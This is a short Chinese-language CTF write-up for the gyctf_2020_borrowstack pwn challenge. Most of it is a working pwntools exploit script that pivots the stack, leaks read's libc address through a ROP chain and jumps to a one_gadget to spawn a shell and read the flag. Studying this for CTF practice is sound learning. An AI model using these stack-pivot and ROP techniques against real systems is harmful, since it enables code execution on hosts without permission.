# one_gadget 和read函数

1. 泄漏处read函数的地址（绝对地址**read_addr**）后只需要将read_addr减去**0x0x6109**，即可得到**one_gadget**的绝对地址：

2. [BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#gyctf_2020_borrowstack)

   ```python
   from pwn import *
   from LibcSearcher import *
   # context(os='linux', arch='amd64', log_level='debug')
   
   # p=remote('node5.buuoj.cn',27691)
   p = process("./pwn")
   elf = ELF("./pwn")
   #获取got、plt地址
   got = elf.got["read"]
   plt = elf.plt["puts"]
   
   leave_ret_addr = 0x0000000000400699
   pop_rdi_ret = 0x0000000000400703
   main_addr = 0x0000000000400626
   new_ebp = 0x0000000000601080
   ret_addr = 0x00000000004004c9
   
   p.recvuntil(b'want')
   # 进行栈迁移
   payload1 = b"a"*0x60 + p64(new_ebp) + p64(leave_ret_addr)
   p.send(payload1)
   p.recvuntil(b'now!')
   
   payload = p64(ret_addr)*21 + p64(pop_rdi_ret)+p64(got)+p64(plt)+p64(main_addr)
   p.sendline(payload)
   addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
   
   #read函数只与one_gadget相差0x6109
   success("read_addr==>"+hex(addr))
   one_gadget = 0x4526a
   print(hex(addr - 0x6109))
   payload = b"a"*(0x68) + p64(addr - 0x6109)
   p.send(payload)
   p.sendline(b'cat flag')
   p.interactive()
   
   ```

   